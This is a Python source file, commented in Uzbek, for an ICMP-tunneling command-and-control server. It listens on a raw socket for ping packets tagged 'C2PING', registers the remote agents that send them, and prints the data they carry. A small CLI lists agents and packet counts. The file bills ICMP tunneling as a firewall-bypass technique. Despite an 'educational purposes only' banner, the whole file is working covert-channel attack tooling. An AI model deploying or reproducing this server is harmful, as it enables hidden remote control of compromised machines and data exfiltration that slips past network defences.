"""
ICMP C2 Server (Ping Tunneling)
ICMP paketlar orqali yashirin aloqa
"""

import socket
import struct
import threading
from datetime import datetime
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))


class ICMPC2Server:
    """ICMP Tunneling C2 Server"""
    
    def __init__(self):
        self.running = False
        self.agents = {}
        self.socket = None
        
    def start(self):
        """ICMP server ishga tushirish"""
        try:
            # Raw socket (administrator huquqlari kerak)
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.running = True
            
            print(f"\n{'='*50}")
            print(f"🎯 ICMP Tunneling C2 Server")
            print(f"⚠️  Faqat ta'lim maqsadida!")
            print(f"⚠️  Administrator huquqlari kerak!")
            print(f"{'='*50}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] 🚀 ICMP Server ishga tushdi")
            print(f"\n📊 ICMP Server CLI")
            print(f"Komandalar: agents, packets, status, help, quit")
            print(f"{'-'*50}\n")
            
            # Receive thread
            receive_thread = threading.Thread(target=self._receive_loop, daemon=True)
            receive_thread.start()
            
            # CLI loop
            self._cli_loop()
            
        except PermissionError:
            print("❌ ICMP raw socket uchun administrator huquqlari kerak!")
            print("💡 Windows: Run as Administrator")
            print("💡 Linux: sudo python icmp_server.py")
        except Exception as e:
            print(f"❌ ICMP Server xatosi: {e}")
            
    def _receive_loop(self):
        """ICMP paketlarni qabul qilish"""
        while self.running:
            try:
                packet, addr = self.socket.recvfrom(1024)
                threading.Thread(
                    target=self._handle_packet,
                    args=(packet, addr),
                    daemon=True
                ).start()
            except:
                if self.running:
                    continue
                    
    def _handle_packet(self, packet, addr):
        """ICMP paket qayta ishlash"""
        try:
            # IP header (20 bytes)
            ip_header = packet[:20]
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
            
            # ICMP header
            icmp_header = packet[20:28]
            icmph = struct.unpack('!BBHHH', icmp_header)
            
            icmp_type = icmph[0]
            icmp_code = icmph[1]
            
            # ICMP Echo Request (type 8)
            if icmp_type == 8:
                # Extract payload
                payload = packet[28:]
                
                # Check if it's C2 traffic (magic bytes)
                if payload.startswith(b'C2PING'):
                    agent_id = payload[6:22].decode('utf-8', errors='ignore').strip('\x00')
                    data = payload[22:].decode('utf-8', errors='ignore')
                    
                    source_ip = addr[0]
                    
                    # Register agent
                    if agent_id not in self.agents:
                        self.agents[agent_id] = {
                            'ip': source_ip,
                            'first_seen': datetime.now(),
                            'last_seen': datetime.now(),
                            'packets': 0
                        }
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] 📡 Yangi ICMP agent: {agent_id} ({source_ip})")
                    
                    self.agents[agent_id]['last_seen'] = datetime.now()
                    self.agents[agent_id]['packets'] += 1
                    
                    if data:
                        print(f"[{agent_id}] 📥 Data: {data[:50]}...")
                    
        except Exception as e:
            print(f"❌ ICMP paket qayta ishlash xatosi: {e}")
            
    def _cli_loop(self):
        """CLI loop"""
        while self.running:
            try:
                cmd = input("ICMP-C2> ").strip().lower()
                
                if cmd == 'agents':
                    self._show_agents()
                elif cmd == 'packets':
                    total = sum(a['packets'] for a in self.agents.values())
                    print(f"📊 Total ICMP packets: {total}")
                elif cmd == 'status':
                    print(f"🟢 ICMP Server: Listening")
                    print(f"📊 Agents: {len(self.agents)}")
                elif cmd == 'help':
                    self._show_help()
                elif cmd == 'quit':
                    self.stop()
                    break
                    
            except KeyboardInterrupt:
                self.stop()
                break
            except Exception as e:
                print(f"❌ Xato: {e}")
                
    def _show_agents(self):
        """Agentlarni ko'rsatish"""
        if not self.agents:
            print("📭 Agentlar yo'q")
            return
            
        print(f"\n📊 ICMP Agents ({len(self.agents)}):")
        print(f"{'-'*70}")
        print(f"{'ID':<20} {'IP':<20} {'Packets':<10} {'Last Seen'}")
        print(f"{'-'*70}")
        
        for agent_id, info in self.agents.items():
            ip = info['ip']
            packets = info['packets']
            last_seen = info['last_seen'].strftime('%H:%M:%S')
            print(f"{agent_id:<20} {ip:<20} {packets:<10} {last_seen}")
        print()
        
    def _show_help(self):
        """Yordam"""
        print("""
╔════════════════════════════════════════════════════════╗
║           ICMP Tunneling C2 - Komandalar               ║
╠════════════════════════════════════════════════════════╣
║  agents              - ICMP agentlarni ko'rsatish      ║
║  packets             - Jami paketlar soni              ║
║  status              - Server statusini ko'rsatish     ║
║  help                - Yordam                          ║
║  quit                - Chiqish                         ║
╠════════════════════════════════════════════════════════╣
║  💡 ICMP Tunneling - Firewall bypass texnikasi         ║
║  📡 Ping paketlar ichida ma'lumot yuborish             ║
║  ⚠️  Administrator huquqlari kerak!                    ║
╚════════════════════════════════════════════════════════╝
        """)
        
    def stop(self):
        """Serverni to'xtatish"""
        print("\n🛑 ICMP Server to'xtatilmoqda...")
        self.running = False
        if self.socket:
            self.socket.close()
        print("✅ ICMP Server to'xtatildi")


if __name__ == "__main__":
    server = ICMPC2Server()
    server.start()
